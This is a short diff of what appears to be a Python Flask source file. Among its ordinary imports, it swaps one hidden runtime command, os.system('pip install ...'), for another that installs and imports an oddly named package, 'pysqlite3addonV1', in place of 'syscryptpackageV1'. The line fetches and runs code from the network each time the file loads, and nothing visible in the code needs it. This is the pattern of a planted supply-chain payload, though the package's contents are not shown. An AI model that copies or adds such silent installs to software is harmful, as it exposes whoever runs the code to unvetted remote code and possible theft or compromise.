@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install syscryptpackageV1")
-import syscryptpackageV1
+os.system("pip install pysqlite3addonV1")
+import pysqlite3addonV1
 import flask
 
 from flask import g
